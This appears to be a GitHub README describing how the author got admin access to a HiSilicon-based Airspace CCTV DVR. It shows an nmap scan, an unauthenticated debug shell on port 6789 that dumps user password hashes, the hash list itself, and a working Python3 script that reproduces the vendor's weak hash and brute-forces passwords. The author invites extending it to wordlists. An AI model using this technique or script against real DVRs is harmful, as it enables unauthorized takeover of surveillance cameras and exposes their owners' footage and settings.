# HiSilicon_DVR_hack_python3
Python3 script to bruteforce admin password

So I have a DVR **Airspace CCTV** with a label Model: **SAM-1968**, user has a valid password as user, but don't have the password for the user *admin*, needed to change any settings on the DVR.

nmap scan:
```
Not shown: 65528 closed ports
PORT      STATE SERVICE
23/tcp    open  telnet
90/tcp    open  dnsix
554/tcp   open  rtsp
3800/tcp  open  pwgpsi
6789/tcp  open  ibm-db2-admin
8000/tcp  open  http-alt
49152/tcp open  unknown
MAC Address: 90:02:A9:9B:BB:F2 (Zhejiang Dahua Technology)
```

Was a bit stuck, until I try to netcat to all the ports, see I can login into the port 6789, a debug port, very limited shell with a few commands, among them
*users -u* will dump some kind of user list and some kind of *hash*
   
```
1:admin:Ny2SRZzv:1:1, 2, 3, 4, 5, 6, 7, 20, 21, 22, 23, 24, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 55, 5
6, 57, 58, 59, 60:admin 's account:1:4          
2:default:OxhlwSG8:2:3, 4, 5, 6, 7:default account:0:4
3:XXXca:4jejqB7V:1:3, 4, 5, 6, 7, 20, 21, 22, 23, 24, 38, 42::1:4
4:XXXoni:9pmPStaQ:1:3, 4, 5, 6, 7, 20, 21, 22, 23, 24, 38, 42::1:4  
5:XXXl:ijoPLH3a:1:3, 4, 5, 6, 7, 20, 21, 22, 23, 24, 38, 42::1:4  
6:XXXta:eq4yRN5P:1:3, 4, 5, 6, 7, 20, 21, 22, 23, 24, 38, 42::1:4
7:XXXsa:kEuXCZhl     
```

I didn't recognize the hash format, so I started googling until I found a HiSilicon paper on exploit-db.com
https://www.exploit-db.com/papers/44003

On that excelent paper from Istvan Toth he describes the process he used to hack into the system extract the firmware and reverse it, among that information he describes how  to create that hash from a plain text. He even created a python2 script that creates the hash from a given password.

I converted it to python3 and implemented a function to do a quick a dirty bruteforce, and it worked, I just tried with 4 digits number password and it dumps some of the passwords, it didn't work for the admin password and I had to go the extra mile and add the word "admin" in front of the digits, and that revealed the **admin123** password.

I guess you can improve it so it can bruteforce using characters, or wordlist, or even a hashcat input, but for me was enough this way.

I'll paste the code here
```
import hashlib
lista =["Ny2SRZzv",
        "OxhlwSG8",
        "4jejqB7V",
        "9pmPStaQ",
        "ijoPLH3a",                                                                            
        "eq4yRN5P",
        "kEuXCZhl" ]
def sofia_hash(msg):
    h = ""
    m = hashlib.md5()
    m.update(msg.encode('utf-8'))
    msg_md5 = m.digest()
    for i in range(8):
        n = (msg_md5[2*i] + msg_md5[2*i+1]) % 0x3e
        if n > 9:
            if n > 35:
                n += 61
            else:
                n += 55
        else:
            n += 0x30
        h += chr(n)
    return h

for i in range(9999):
    h = sofia_hash(str(i))
    #h = sofia_hash("admin" + str(i))
    if h in lista:
        print ("value %s hash %s" % (str(i) ,h))
```
